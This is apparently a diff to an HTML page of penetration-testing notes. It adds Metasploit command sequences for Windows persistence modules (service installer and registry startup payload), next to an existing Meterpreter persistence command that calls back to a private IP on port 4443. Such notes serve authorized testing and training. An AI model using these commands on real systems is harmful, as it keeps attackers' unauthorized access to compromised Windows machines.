@@ -15,6 +15,32 @@ run persistence -U -i 5 -p 4443 -r 192.168.x.x <br/>
 <br/>
 <br/>
 <br/>
+<span style="font-size: 12pt"><u>Windows Persistent Service Installer</u>&nbsp; <br/>
+<br/>
+msf &gt; use exploit/windows/local/persistence_service<br/>
+msf exploit(persistence_service) &gt; show targets<br/>
+msf exploit(persistence_service) &gt; set TARGET &lt; target-id &gt;<br/>
+msf exploit(persistence_service) &gt; show options<br/>
+msf exploit(persistence_service) &gt; exploit<br/>
+<br/>
+<br/>
+</span><span style="font-size: 12pt"><u>Windows Persistent Registry Startup Payload Installer</u></span>&nbsp;<br/>
+<br/>
+<span style="font-size: 12pt">msf &gt; use exploit/windows/local/persistence <br/>
+msf exploit(persistence) &gt; show targets<br/>
+msf exploit(persistence) &gt; set TARGET &lt; target-id &gt; <br/>
+msf exploit(persistence) &gt; show options<br/>
+msf exploit(persistence) &gt; exploit<br/>
+<br/>
+</span><br/>
+<span style="font-size: 12pt"><br/>
+</span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
 <img src="image.png" /><br/>
 <br/>
 </body></html>
